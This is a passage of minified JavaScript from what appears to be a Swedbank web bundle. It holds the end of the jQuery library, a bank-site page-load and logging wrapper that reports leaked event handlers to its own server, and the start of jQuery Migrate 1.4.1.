transport&&transport.abort(finalText),done(0,finalText),this}};if(deferred.promise(jqXHR).complete=completeDeferred.add,jqXHR.success=jqXHR.done,jqXHR.error=jqXHR.fail,s.url=((url||s.url||ajaxLocation)+"").replace(rhash,"").replace(rprotocol,ajaxLocParts[1]+"//"),s.type=options.method||options.type||s.method||s.type,s.dataTypes=jQuery.trim(s.dataType||"*").toLowerCase().match(rnotwhite)||[""],null==s.crossDomain&&(parts=rurl.exec(s.url.toLowerCase()),s.crossDomain=!(!parts||parts[1]===ajaxLocParts[1]&&parts[2]===ajaxLocParts[2]&&(parts[3]||("http:"===parts[1]?"80":"443"))===(ajaxLocParts[3]||("http:"===ajaxLocParts[1]?"80":"443")))),s.data&&s.processData&&"string"!=typeof s.data&&(s.data=jQuery.param(s.data,s.traditional)),inspectPrefiltersOrTransports(prefilters,s,options,jqXHR),2===state)return jqXHR;for(i in(fireGlobals=jQuery.event&&s.global)&&0==jQuery.active++&&jQuery.event.trigger("ajaxStart"),s.type=s.type.toUpperCase(),s.hasContent=!rnoContent.test(s.type),cacheURL=s.url,s.hasContent||(s.data&&(cacheURL=s.url+=(rquery.test(cacheURL)?"&":"?")+s.data,delete s.data),!1===s.cache&&(s.url=rts.test(cacheURL)?cacheURL.replace(rts,"$1_="+nonce++):cacheURL+(rquery.test(cacheURL)?"&":"?")+"_="+nonce++)),s.ifModified&&(jQuery.lastModified[cacheURL]&&jqXHR.setRequestHeader("If-Modified-Since",jQuery.lastModified[cacheURL]),jQuery.etag[cacheURL]&&jqXHR.setRequestHeader("If-None-Match",jQuery.etag[cacheURL])),(s.data&&s.hasContent&&!1!==s.contentType||options.contentType)&&jqXHR.setRequestHeader("Content-Type",s.contentType),jqXHR.setRequestHeader("Accept",s.dataTypes[0]&&s.accepts[s.dataTypes[0]]?s.accepts[s.dataTypes[0]]+("*"!==s.dataTypes[0]?", "+allTypes+"; q=0.01":""):s.accepts["*"]),s.headers)jqXHR.setRequestHeader(i,s.headers[i]);if(s.beforeSend&&(!1===s.beforeSend.call(callbackContext,jqXHR,s)||2===state))return jqXHR.abort();for(i in strAbort="abort",{success:1,error:1,complete:1})jqXHR[i](s[i]);if(transport=inspectPrefiltersOrTransports(transports,s,options,jqXHR)){if(jqXHR.readyState=1,fireGlobals&&globalEventContext.trigger("ajaxSend",[jqXHR,s]),2===state)return jqXHR;s.async&&s.timeout>0&&(timeoutTimer=window.setTimeout((function(){jqXHR.abort("timeout")}),s.timeout));try{state=1,transport.send(requestHeaders,done)}catch(e){if(!(state<2))throw e;done(-1,e)}}else done(-1,"No Transport");function done(status,nativeStatusText,responses,headers){var isSuccess,success,error,response,modified,statusText=nativeStatusText;2!==state&&(state=2,timeoutTimer&&window.clearTimeout(timeoutTimer),transport=void 0,responseHeadersString=headers||"",jqXHR.readyState=status>0?4:0,isSuccess=status>=200&&status<300||304===status,responses&&(response=function ajaxHandleResponses(s,jqXHR,responses){for(var firstDataType,ct,finalDataType,type,contents=s.contents,dataTypes=s.dataTypes;"*"===dataTypes[0];)dataTypes.shift(),void 0===ct&&(ct=s.mimeType||jqXHR.getResponseHeader("Content-Type"));if(ct)for(type in contents)if(contents[type]&&contents[type].test(ct)){dataTypes.unshift(type);break}if(dataTypes[0]in responses)finalDataType=dataTypes[0];else{for(type in responses){if(!dataTypes[0]||s.converters[type+" "+dataTypes[0]]){finalDataType=type;break}firstDataType||(firstDataType=type)}finalDataType=finalDataType||firstDataType}if(finalDataType)return finalDataType!==dataTypes[0]&&dataTypes.unshift(finalDataType),responses[finalDataType]}(s,jqXHR,responses)),response=function ajaxConvert(s,response,jqXHR,isSuccess){var conv2,current,conv,tmp,prev,converters={},dataTypes=s.dataTypes.slice();if(dataTypes[1])for(conv in s.converters)converters[conv.toLowerCase()]=s.converters[conv];for(current=dataTypes.shift();current;)if(s.responseFields[current]&&(jqXHR[s.responseFields[current]]=response),!prev&&isSuccess&&s.dataFilter&&(response=s.dataFilter(response,s.dataType)),prev=current,current=dataTypes.shift())if("*"===current)current=prev;else if("*"!==prev&&prev!==current){if(!(conv=converters[prev+" "+current]||converters["* "+current]))for(conv2 in converters)if((tmp=conv2.split(" "))[1]===current&&(conv=converters[prev+" "+tmp[0]]||converters["* "+tmp[0]])){!0===conv?conv=converters[conv2]:!0!==converters[conv2]&&(current=tmp[0],dataTypes.unshift(tmp[1]));break}if(!0!==conv)if(conv&&s.throws)response=conv(response);else try{response=conv(response)}catch(e){return{state:"parsererror",error:conv?e:"No conversion from "+prev+" to "+current}}}return{state:"success",data:response}}(s,response,jqXHR,isSuccess),isSuccess?(s.ifModified&&((modified=jqXHR.getResponseHeader("Last-Modified"))&&(jQuery.lastModified[cacheURL]=modified),(modified=jqXHR.getResponseHeader("etag"))&&(jQuery.etag[cacheURL]=modified)),204===status||"HEAD"===s.type?statusText="nocontent":304===status?statusText="notmodified":(statusText=response.state,success=response.data,isSuccess=!(error=response.error))):(error=statusText,!status&&statusText||(statusText="error",status<0&&(status=0))),jqXHR.status=status,jqXHR.statusText=(nativeStatusText||statusText)+"",isSuccess?deferred.resolveWith(callbackContext,[success,statusText,jqXHR]):deferred.rejectWith(callbackContext,[jqXHR,statusText,error]),jqXHR.statusCode(statusCode),statusCode=void 0,fireGlobals&&globalEventContext.trigger(isSuccess?"ajaxSuccess":"ajaxError",[jqXHR,s,isSuccess?success:error]),completeDeferred.fireWith(callbackContext,[jqXHR,statusText]),fireGlobals&&(globalEventContext.trigger("ajaxComplete",[jqXHR,s]),--jQuery.active||jQuery.event.trigger("ajaxStop")))}return jqXHR},getJSON:function(url,data,callback){return jQuery.get(url,data,callback,"json")},getScript:function(url,callback){return jQuery.get(url,void 0,callback,"script")}}),jQuery.each(["get","post"],(function(i,method){jQuery[method]=function(url,data,callback,type){return jQuery.isFunction(data)&&(type=type||callback,callback=data,data=void 0),jQuery.ajax(jQuery.extend({url:url,type:method,dataType:type,data:data,success:callback},jQuery.isPlainObject(url)&&url))}})),jQuery._evalUrl=function(url){return jQuery.ajax({url:url,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,throws:!0})},jQuery.fn.extend({wrapAll:function(html){if(jQuery.isFunction(html))return this.each((function(i){jQuery(this).wrapAll(html.call(this,i))}));if(this[0]){var wrap=jQuery(html,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&wrap.insertBefore(this[0]),wrap.map((function(){for(var elem=this;elem.firstChild&&1===elem.firstChild.nodeType;)elem=elem.firstChild;return elem})).append(this)}return this},wrapInner:function(html){return jQuery.isFunction(html)?this.each((function(i){jQuery(this).wrapInner(html.call(this,i))})):this.each((function(){var self=jQuery(this),contents=self.contents();contents.length?contents.wrapAll(html):self.append(html)}))},wrap:function(html){var isFunction=jQuery.isFunction(html);return this.each((function(i){jQuery(this).wrapAll(isFunction?html.call(this,i):html)}))},unwrap:function(){return this.parent().each((function(){jQuery.nodeName(this,"body")||jQuery(this).replaceWith(this.childNodes)})).end()}}),jQuery.expr.filters.hidden=function(elem){return support.reliableHiddenOffsets()?elem.offsetWidth<=0&&elem.offsetHeight<=0&&!elem.getClientRects().length:function filterHidden(elem){if(!jQuery.contains(elem.ownerDocument||document,elem))return!0;for(;elem&&1===elem.nodeType;){if("none"===getDisplay(elem)||"hidden"===elem.type)return!0;elem=elem.parentNode}return!1}(elem)},jQuery.expr.filters.visible=function(elem){return!jQuery.expr.filters.hidden(elem)};var r20=/%20/g,rbracket=/\[\]$/,rCRLF=/\r?\n/g,rsubmitterTypes=/^(?:submit|button|image|reset|file)$/i,rsubmittable=/^(?:input|select|textarea|keygen)/i;function buildParams(prefix,obj,traditional,add){var name;if(jQuery.isArray(obj))jQuery.each(obj,(function(i,v){traditional||rbracket.test(prefix)?add(prefix,v):buildParams(prefix+"["+("object"==typeof v&&null!=v?i:"")+"]",v,traditional,add)}));else if(traditional||"object"!==jQuery.type(obj))add(prefix,obj);else for(name in obj)buildParams(prefix+"["+name+"]",obj[name],traditional,add)}jQuery.param=function(a,traditional){var prefix,s=[],add=function(key,value){value=jQuery.isFunction(value)?value():null==value?"":value,s[s.length]=encodeURIComponent(key)+"="+encodeURIComponent(value)};if(void 0===traditional&&(traditional=jQuery.ajaxSettings&&jQuery.ajaxSettings.traditional),jQuery.isArray(a)||a.jquery&&!jQuery.isPlainObject(a))jQuery.each(a,(function(){add(this.name,this.value)}));else for(prefix in a)buildParams(prefix,a[prefix],traditional,add);return s.join("&").replace(r20,"+")},jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map((function(){var elements=jQuery.prop(this,"elements");return elements?jQuery.makeArray(elements):this})).filter((function(){var type=this.type;return this.name&&!jQuery(this).is(":disabled")&&rsubmittable.test(this.nodeName)&&!rsubmitterTypes.test(type)&&(this.checked||!rcheckableType.test(type))})).map((function(i,elem){var val=jQuery(this).val();return null==val?null:jQuery.isArray(val)?jQuery.map(val,(function(val){return{name:elem.name,value:val.replace(rCRLF,"\r\n")}})):{name:elem.name,value:val.replace(rCRLF,"\r\n")}})).get()}}),jQuery.ajaxSettings.xhr=void 0!==window.ActiveXObject?function(){return this.isLocal?createActiveXHR():document.documentMode>8?createStandardXHR():/^(get|post|head|put|delete|options)$/i.test(this.type)&&createStandardXHR()||createActiveXHR()}:createStandardXHR;var xhrId=0,xhrCallbacks={},xhrSupported=jQuery.ajaxSettings.xhr();function createStandardXHR(){try{return new window.XMLHttpRequest}catch(e){}}function createActiveXHR(){try{return new window.ActiveXObject("Microsoft.XMLHTTP")}catch(e){}}window.attachEvent&&window.attachEvent("onunload",(function(){for(var key in xhrCallbacks)xhrCallbacks[key](void 0,!0)})),support.cors=!!xhrSupported&&"withCredentials"in xhrSupported,(xhrSupported=support.ajax=!!xhrSupported)&&jQuery.ajaxTransport((function(options){var callback;if(!options.crossDomain||support.cors)return{send:function(headers,complete){var i,xhr=options.xhr(),id=++xhrId;if(xhr.open(options.type,options.url,options.async,options.username,options.password),options.xhrFields)for(i in options.xhrFields)xhr[i]=options.xhrFields[i];for(i in options.mimeType&&xhr.overrideMimeType&&xhr.overrideMimeType(options.mimeType),options.crossDomain||headers["X-Requested-With"]||(headers["X-Requested-With"]="XMLHttpRequest"),headers)void 0!==headers[i]&&xhr.setRequestHeader(i,headers[i]+"");xhr.send(options.hasContent&&options.data||null),callback=function(_,isAbort){var status,statusText,responses;if(callback&&(isAbort||4===xhr.readyState))if(delete xhrCallbacks[id],callback=void 0,xhr.onreadystatechange=jQuery.noop,isAbort)4!==xhr.readyState&&xhr.abort();else{responses={},status=xhr.status,"string"==typeof xhr.responseText&&(responses.text=xhr.responseText);try{statusText=xhr.statusText}catch(e){statusText=""}status||!options.isLocal||options.crossDomain?1223===status&&(status=204):status=responses.text?200:404}responses&&complete(status,statusText,responses,xhr.getAllResponseHeaders())},options.async?4===xhr.readyState?window.setTimeout(callback):xhr.onreadystatechange=xhrCallbacks[id]=callback:callback()},abort:function(){callback&&callback(void 0,!0)}}})),jQuery.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(text){return jQuery.globalEval(text),text}}}),jQuery.ajaxPrefilter("script",(function(s){void 0===s.cache&&(s.cache=!1),s.crossDomain&&(s.type="GET",s.global=!1)})),jQuery.ajaxTransport("script",(function(s){if(s.crossDomain){var script,head=document.head||jQuery("head")[0]||document.documentElement;return{send:function(_,callback){(script=document.createElement("script")).async=!0,s.scriptCharset&&(script.charset=s.scriptCharset),script.src=s.url,script.onload=script.onreadystatechange=function(_,isAbort){(isAbort||!script.readyState||/loaded|complete/.test(script.readyState))&&(script.onload=script.onreadystatechange=null,script.parentNode&&script.parentNode.removeChild(script),script=null,isAbort||callback(200,"success"))},head.insertBefore(script,head.firstChild)},abort:function(){script&&script.onload(void 0,!0)}}}}));var oldCallbacks=[],rjsonp=/(=)\?(?=&|$)|\?\?/;jQuery.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var callback=oldCallbacks.pop()||jQuery.expando+"_"+nonce++;return this[callback]=!0,callback}}),jQuery.ajaxPrefilter("json jsonp",(function(s,originalSettings,jqXHR){var callbackName,overwritten,responseContainer,jsonProp=!1!==s.jsonp&&(rjsonp.test(s.url)?"url":"string"==typeof s.data&&0===(s.contentType||"").indexOf("application/x-www-form-urlencoded")&&rjsonp.test(s.data)&&"data");if(jsonProp||"jsonp"===s.dataTypes[0])return callbackName=s.jsonpCallback=jQuery.isFunction(s.jsonpCallback)?s.jsonpCallback():s.jsonpCallback,jsonProp?s[jsonProp]=s[jsonProp].replace(rjsonp,"$1"+callbackName):!1!==s.jsonp&&(s.url+=(rquery.test(s.url)?"&":"?")+s.jsonp+"="+callbackName),s.converters["script json"]=function(){return responseContainer||jQuery.error(callbackName+" was not called"),responseContainer[0]},s.dataTypes[0]="json",overwritten=window[callbackName],window[callbackName]=function(){responseContainer=arguments},jqXHR.always((function(){void 0===overwritten?jQuery(window).removeProp(callbackName):window[callbackName]=overwritten,s[callbackName]&&(s.jsonpCallback=originalSettings.jsonpCallback,oldCallbacks.push(callbackName)),responseContainer&&jQuery.isFunction(overwritten)&&overwritten(responseContainer[0]),responseContainer=overwritten=void 0})),"script"})),jQuery.parseHTML=function(data,context,keepScripts){if(!data||"string"!=typeof data)return null;"boolean"==typeof context&&(keepScripts=context,context=!1),context=context||document;var parsed=rsingleTag.exec(data),scripts=!keepScripts&&[];return parsed?[context.createElement(parsed[1])]:(parsed=buildFragment([data],context,scripts),scripts&&scripts.length&&jQuery(scripts).remove(),jQuery.merge([],parsed.childNodes))};var _load=jQuery.fn.load;function getWindow(elem){return jQuery.isWindow(elem)?elem:9===elem.nodeType&&(elem.defaultView||elem.parentWindow)}jQuery.fn.load=function(url,params,callback){if("string"!=typeof url&&_load)return _load.apply(this,arguments);var selector,type,response,self=this,off=url.indexOf(" ");return off>-1&&(selector=jQuery.trim(url.slice(off,url.length)),url=url.slice(0,off)),jQuery.isFunction(params)?(callback=params,params=void 0):params&&"object"==typeof params&&(type="POST"),self.length>0&&jQuery.ajax({url:url,type:type||"GET",dataType:"html",data:params}).done((function(responseText){response=arguments,self.html(selector?jQuery("<div>").append(jQuery.parseHTML(responseText)).find(selector):responseText)})).always(callback&&function(jqXHR,status){self.each((function(){callback.apply(this,response||[jqXHR.responseText,status,jqXHR])}))}),this},jQuery.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],(function(i,type){jQuery.fn[type]=function(fn){return this.on(type,fn)}})),jQuery.expr.filters.animated=function(elem){return jQuery.grep(jQuery.timers,(function(fn){return elem===fn.elem})).length},jQuery.offset={setOffset:function(elem,options,i){var curPosition,curLeft,curCSSTop,curTop,curOffset,curCSSLeft,position=jQuery.css(elem,"position"),curElem=jQuery(elem),props={};"static"===position&&(elem.style.position="relative"),curOffset=curElem.offset(),curCSSTop=jQuery.css(elem,"top"),curCSSLeft=jQuery.css(elem,"left"),("absolute"===position||"fixed"===position)&&jQuery.inArray("auto",[curCSSTop,curCSSLeft])>-1?(curTop=(curPosition=curElem.position()).top,curLeft=curPosition.left):(curTop=parseFloat(curCSSTop)||0,curLeft=parseFloat(curCSSLeft)||0),jQuery.isFunction(options)&&(options=options.call(elem,i,jQuery.extend({},curOffset))),null!=options.top&&(props.top=options.top-curOffset.top+curTop),null!=options.left&&(props.left=options.left-curOffset.left+curLeft),"using"in options?options.using.call(elem,props):curElem.css(props)}},jQuery.fn.extend({offset:function(options){if(arguments.length)return void 0===options?this:this.each((function(i){jQuery.offset.setOffset(this,options,i)}));var docElem,win,box={top:0,left:0},elem=this[0],doc=elem&&elem.ownerDocument;return doc?(docElem=doc.documentElement,jQuery.contains(docElem,elem)?(void 0!==elem.getBoundingClientRect&&(box=elem.getBoundingClientRect()),win=getWindow(doc),{top:box.top+(win.pageYOffset||docElem.scrollTop)-(docElem.clientTop||0),left:box.left+(win.pageXOffset||docElem.scrollLeft)-(docElem.clientLeft||0)}):box):void 0},position:function(){if(this[0]){var offsetParent,offset,parentOffset={top:0,left:0},elem=this[0];return"fixed"===jQuery.css(elem,"position")?offset=elem.getBoundingClientRect():(offsetParent=this.offsetParent(),offset=this.offset(),jQuery.nodeName(offsetParent[0],"html")||(parentOffset=offsetParent.offset()),parentOffset.top+=jQuery.css(offsetParent[0],"borderTopWidth",!0),parentOffset.left+=jQuery.css(offsetParent[0],"borderLeftWidth",!0)),{top:offset.top-parentOffset.top-jQuery.css(elem,"marginTop",!0),left:offset.left-parentOffset.left-jQuery.css(elem,"marginLeft",!0)}}},offsetParent:function(){return this.map((function(){for(var offsetParent=this.offsetParent;offsetParent&&!jQuery.nodeName(offsetParent,"html")&&"static"===jQuery.css(offsetParent,"position");)offsetParent=offsetParent.offsetParent;return offsetParent||documentElement}))}}),jQuery.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},(function(method,prop){var top=/Y/.test(prop);jQuery.fn[method]=function(val){return access(this,(function(elem,method,val){var win=getWindow(elem);if(void 0===val)return win?prop in win?win[prop]:win.document.documentElement[method]:elem[method];win?win.scrollTo(top?jQuery(win).scrollLeft():val,top?val:jQuery(win).scrollTop()):elem[method]=val}),method,val,arguments.length,null)}})),jQuery.each(["top","left"],(function(i,prop){jQuery.cssHooks[prop]=addGetHookIf(support.pixelPosition,(function(elem,computed){if(computed)return computed=curCSS(elem,prop),rnumnonpx.test(computed)?jQuery(elem).position()[prop]+"px":computed}))})),jQuery.each({Height:"height",Width:"width"},(function(name,type){jQuery.each({padding:"inner"+name,content:type,"":"outer"+name},(function(defaultExtra,funcName){jQuery.fn[funcName]=function(margin,value){var chainable=arguments.length&&(defaultExtra||"boolean"!=typeof margin),extra=defaultExtra||(!0===margin||!0===value?"margin":"border");return access(this,(function(elem,type,value){var doc;return jQuery.isWindow(elem)?elem.document.documentElement["client"+name]:9===elem.nodeType?(doc=elem.documentElement,Math.max(elem.body["scroll"+name],doc["scroll"+name],elem.body["offset"+name],doc["offset"+name],doc["client"+name])):void 0===value?jQuery.css(elem,type,extra):jQuery.style(elem,type,value,extra)}),type,chainable?margin:void 0,chainable,null)}}))})),jQuery.fn.extend({bind:function(types,data,fn){return this.on(types,null,data,fn)},unbind:function(types,fn){return this.off(types,null,fn)},delegate:function(selector,types,data,fn){return this.on(types,selector,data,fn)},undelegate:function(selector,types,fn){return 1===arguments.length?this.off(selector,"**"):this.off(types,selector||"**",fn)}}),jQuery.fn.size=function(){return this.length},jQuery.fn.andSelf=jQuery.fn.addBack,"function"==typeof define&&define.amd&&define("jquery",[],(function(){return jQuery}));var _jQuery=window.jQuery,_$=window.$;return jQuery.noConflict=function(deep){return window.$===jQuery&&(window.$=_$),deep&&window.jQuery===jQuery&&(window.jQuery=_jQuery),jQuery},noGlobal||(window.jQuery=window.$=jQuery),jQuery})),window.Swedbank={country:null,language:null,PageConfig:{},toggleLoader(flag){document.documentElement.classList.toggle("-loading",flag)},isUiSpaEnabled:window.localStorage&&window.localStorage.getItem("ui-spa-debug")||!1,sym(description){return Object.getOwnPropertySymbols(this).find((s=>s.description===description))}},Swedbank.log=function(){Swedbank.isProduction||console.log.apply(console,arguments)},Swedbank.info=function(){Swedbank.isProduction||console.info.apply(console,arguments)},Swedbank.warn=function(){Swedbank.isProduction||console.warn.apply(console,arguments)},Swedbank.error=function(){Swedbank.isProduction||console.error.apply(console,arguments)},function(originalJQ){var wrappedJQ=function(selector,context){if("function"!=typeof selector)return selector===document||void 0===selector?replaceFunction("ready"):selector===window?replaceFunction("load"):new originalJQ.fn.init(selector,context);function replaceFunction(name){var jQ=new originalJQ.fn.init(selector,context);return jQ[name]=Swedbank.PageLoad.onEach,jQ}Swedbank.PageLoad.onEach(selector)};function Callbacks(){function Entry(callback,toKeep){this.callback=callback,this.toKeep=toKeep;var entry=this;this.exec=function(){try{entry.callback.call(null,wrappedJQ)}catch(e){console.error(e)}}}this.callbacks=[],this.remember=function(callback,toKeep){this.callbacks.push(new Entry(callback,toKeep))},this.rememberOrExecute=function(callback,toKeep){PL.pageLoadingInProgress?this.remember(callback,toKeep):callback(wrappedJQ)},this.execute=function(){for(var i=0;i<this.callbacks.length;i++)this.callbacks[i].exec()},this.keepOnlyGlobal=function(){this.callbacks=this.callbacks.filter((function(e){return e.toKeep}))}}wrappedJQ.fn=wrappedJQ.prototype=originalJQ.fn,jQuery.extend(wrappedJQ,originalJQ),window.jQuery=wrappedJQ;var _handlers=[];var PL=Swedbank.PageLoad={callbacks:new Callbacks,cleanupCallbacks:new Callbacks,useGlobal:!0,pageLoadingInProgress:!0,onEach:function(callback){PL.callbacks.rememberOrExecute(callback,PL.useGlobal)},onFirst:function(callback){PL.callbacks.rememberOrExecute(callback,!1)},onUnload:function(callback){PL.cleanupCallbacks.remember(callback,PL.useGlobal)},onEachUnload:function(callback){PL.cleanupCallbacks.remember(callback,!0)},setGlobalScriptsRegistered:function(){PL.useGlobal=!1},pageLoaded:function(){PL.callbacks.execute(),PL.pageLoadingInProgress=!1},prepareForPageLoad:function(){PL.pageLoadingInProgress=!0,PL.cleanupCallbacks.execute(),PL.cleanupCallbacks.keepOnlyGlobal(),PL.callbacks.keepOnlyGlobal(),function detectLeakedHandlers(){if(_handlers.length){var newHandlers=getHandlers();if(_handlers.length!==newHandlers.length){var addedHandlers=[],removedHandlers=[];newHandlers.forEach((function(e){-1===_handlers.indexOf(e)&&addedHandlers.push(e)})),_handlers.forEach((function(e){-1===newHandlers.indexOf(e)&&removedHandlers.push(e)})),_handlers=newHandlers,function sendLog(newHandlers,removedHandlers){var data={pageId:Swedbank.Navigation.pageId},addedOnes=mapAndRememberHandlers(newHandlers,"leak_"),removedOnes=mapAndRememberHandlers(removedHandlers,"REMOVED_");function mapAndRememberHandlers(handlers,prefix){var i=0,result=handlers.map((function(e){return e.handler.toString()}));return result.forEach((function(e){data[prefix+i++]=e})),result}addedOnes.length&&(Swedbank.log(Swedbank.Navigation.pageId,addedOnes.length," new handler(s) added"),Swedbank.log("New handler(s): ",newHandlers.map((function(e){return e.handler})),addedOnes)),removedOnes.length&&(Swedbank.log(Swedbank.Navigation.pageId,removedOnes.length," handler(s) removed"),Swedbank.log("Removed handler(s): ",removedHandlers.map((function(e){return e.handler})),removedOnes)),wrappedJQ.ajax({type:"POST",url:"/spaLog",data:data})}(addedHandlers,removedHandlers)}}else _handlers=getHandlers(),Swedbank.log("Initial handlers count: ",_handlers.length);function getHandlers(){var handlers=[];return wrappedJQ.each([window,document,"html","body"],(function(i,target){wrappedJQ.each(wrappedJQ(target).data("events"),(function(k,v){handlers.push.apply(handlers,v)}))})),handlers}}()}};wrappedJQ.fn.untilUnload=function(){var self=this,args=arguments;return self.on.apply(self,args),Swedbank.PageLoad.onUnload((function(){self.off.apply(self,args)})),self},originalJQ(PL.pageLoaded)}(jQuery),function(jQuery,window,undefined){jQuery.migrateVersion="1.4.1";var warnedAbout={};function migrateWarn(msg){var console=window.console;warnedAbout[msg]||(warnedAbout[msg]=!0,jQuery.migrateWarnings.push(msg),console&&console.warn&&!jQuery.migrateMute&&(console.warn("JQMIGRATE: "+msg),jQuery.migrateTrace&&console.trace&&console.trace()))}function migrateWarnProp(obj,prop,value,msg){if(Object.defineProperty)try{return void Object.defineProperty(obj,prop,{configurable:!0,enumerable:!0,get:function(){return migrateWarn(msg),value},set:function(newValue){migrateWarn(msg),value=newValue}})}catch(err){}jQuery._definePropertyBroken=!0,obj[prop]=value}jQuery.migrateWarnings=[],window.console&&window.console.log&&window.console.log("JQMIGRATE: Migrate is installed"+(jQuery.migrateMute?"":" with logging active")+", version "+jQuery.migrateVersion),undefined===jQuery.migrateTrace&&(jQuery.migrateTrace=!0),jQuery.migrateReset=function(){warnedAbout={},jQuery.migrateWarnings.length=0},"BackCompat"===document.compatMode&&migrateWarn("jQuery is not compatible with Quirks Mode");var attrFn=jQuery("<input/>",{size:1}).attr("size")&&jQuery.attrFn,oldAttr=jQuery.attr,valueAttrGet=jQuery.attrHooks.value&&jQuery.attrHooks.value.get||function(){return null},valueAttrSet=jQuery.attrHooks.value&&jQuery.attrHooks.value.set||function(){},rnoType=/^(?:input|button)$/i,rnoAttrNodeType=/^[238]$/,rboolean=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,ruseDefault=/^(?:checked|selected)$/i;migrateWarnProp(jQuery,"attrFn",attrFn||{},"jQuery.attrFn is deprecated"),jQuery.attr=function(elem,name,value,pass){var lowerName=name.toLowerCase(),nType=elem&&elem.nodeType;return pass&&(oldAttr.length<4&&migrateWarn("jQuery.fn.attr( props, pass ) is deprecated"),elem&&!rnoAttrNodeType.test(nType)&&(attrFn?name in attrFn:jQuery.isFunction(jQuery.fn[name])))?jQuery(elem)[name](value):("type"===name&&undefined!==value&&rnoType.test(elem.nodeName)&&elem.parentNode&&migrateWarn("Can't change the 'type' of an input or button in IE 6/7/8"),!jQuery.attrHooks[lowerName]&&rboolean.test(lowerName)&&(jQuery.attrHooks[lowerName]={get:function(elem,name){var attrNode,property=jQuery.prop(elem,name);return!0===property||"boolean"!=typeof property&&(attrNode=elem.getAttributeNode(name))&&!1!==attrNode.nodeValue?name.toLowerCase():undefined},set:function(elem,value,name){var propName;return!1===value?jQuery.removeAttr(elem,name):((propName=jQuery.propFix[name]||name)in elem&&(elem[propName]=!0),elem.setAttribute(name,name.toLowerCase())),name}},ruseDefault.test(lowerName)&&migrateWarn("jQuery.fn.attr('"+lowerName+"') might use property instead of attribute")),oldAttr.call(jQuery,elem,name,value))},jQuery.attrHooks.value={get:function(elem,name){var nodeName=(elem.nodeName||"").toLowerCase();return"button"===nodeName?valueAttrGet.apply(this,arguments):("input"!==nodeName&&"option"!==nodeName&&migrateWarn("jQuery.fn.attr('value') no longer gets properties"),name in elem?elem.value:null)},set:function(elem,value){var nodeName=(elem.nodeName||"").toLowerCase();if("button"===nodeName)return valueAttrSet.apply(this,arguments);"input"!==nodeName&&"option"!==nodeName&&migrateWarn("jQuery.fn.attr('value', val) no longer sets properties"),elem.value=value}};var matched,browser,findProp,oldInit=jQuery.fn.init,oldFind=jQuery.find,oldParseJSON=jQuery.parseJSON,rspaceAngle=/^\s*</,rattrHashTest=/\[(\s*[-\w]+\s*)([~|^$*]?=)\s*([-\w#]*?#[-\w#]*)\s*\]/,rattrHashGlob=/\[(\s*[-\w]+\s*)([~|^$*]?=)\s*([-\w#]*?#[-\w#]*)\s*\]/g,rquickExpr=/^([^<]*)(<[\w\W]+>)([^>]*)$/;for(findProp in jQuery.fn.init=function(selector,context,rootjQuery){var match,ret;return selector&&"string"==typeof selector&&!jQuery.isPlainObject(context)&&(match=rquickExpr.exec(jQuery.trim(selector)))&&match[0]&&(rspaceAngle.test(selector)||migrateWarn("$(html) HTML strings must start with '<' character"),match[3]&&migrateWarn("$(html) HTML text after last tag is ignored"),"#"===match[0].charAt(0)&&(migrateWarn("HTML string cannot start with a '#' character"),jQuery.error("JQMIGRATE: Invalid selector string (XSS)")),context&&context.context&&context.context.nodeType&&(context=context.context),jQuery.parseHTML)?oldInit.call(this,jQuery.parseHTML(match[2],context&&context.ownerDocument||context||document,!0),context,rootjQuery):(ret=oldInit.apply(this,arguments),selector&&undefined!==selector.selector?(ret.selector=selector.selector,ret.context=selector.context):(ret.selector="string"==typeof selector?selector:"",selector&&(ret.context=selector.nodeType?selector:context||document)),ret)},jQuery.fn.init.prototype=jQuery.fn,jQuery.find=function(selector){var args=Array.prototype.slice.call(arguments);if("string"==typeof selector&&rattrHashTest.test(selector))try{document.querySelector(selector)}catch(err1){selector=selector.replace(rattrHashGlob,(function(_,attr,op,value){return"["+attr+op+'"'+value+'"]'}));try{document.querySelector(selector),migrateWarn("Attribute selector with '#' must be quoted: "+args[0]),args[0]=selector}catch(err2){migrateWarn("Attribute selector with '#' was not fixed: "+args[0])}}return oldFind.apply(this,args)},oldFind)Object.prototype.hasOwnProperty.call(oldFind,findProp)&&(jQuery.find[findProp]=oldFind[findProp]);jQuery.parseJSON=function(json){return json?oldParseJSON.apply(this,arguments):(migrateWarn("jQuery.parseJSON requires a valid JSON string"),null)},jQuery.uaMatch=function(ua){ua=ua.toLowerCase();var match=/(chrome)[ \/]([\w.]+)/.exec(ua)||/(webkit)[ \/]([\w.]+)/.exec(ua)||/(opera)(?:.*version|)[ \/]([\w.]+)/.exec(ua)||/(msie) ([\w.]+)/.exec(ua)||ua.indexOf("compatible")<0&&/(mozilla)(?:.*? rv:([\w.]+)|)/.exec(ua)||[];return{browser:match[1]||"",version:match[2]||"0"}},jQuery.browser||(browser={},(matched=jQuery.uaMatch(navigator.userAgent)).browser&&(browser[matched.browser]=!0,browser.version=matched.version),browser.chrome?browser.webkit=!0:browser.webkit&&(browser.safari=!0),jQuery.browser=browser),jQuery.boxModel=jQuery.support.boxModel="CSS1Compat"===document.compatMode,migrateWarnProp(jQuery,"boxModel",jQuery.boxModel,"jQuery.boxModel is deprecated"),migrateWarnProp(jQuery.support,"boxModel",jQuery.support.boxModel,"jQuery.support.boxModel is deprecated"),jQuery.sub=function(){function jQuerySub(selector,context){return new jQuerySub.fn.init(selector,context)}jQuery.extend(!0,jQuerySub,this),jQuerySub.superclass=this,jQuerySub.fn=jQuerySub.prototype=this(),jQuerySub.fn.constructor=jQuerySub,jQuerySub.sub=this.sub,jQuerySub.fn.init=function init(selector,context){var instance=jQuery.fn.init.call(this,selector,context,rootjQuerySub);return instance instanceof jQuerySub?instance:jQuerySub(instance)},jQuerySub.fn.init.prototype=jQuerySub.fn;var rootjQuerySub=jQuerySub(document);return migrateWarn("jQuery.sub() is deprecated"),jQuerySub},jQuery.fn.size=function(){return 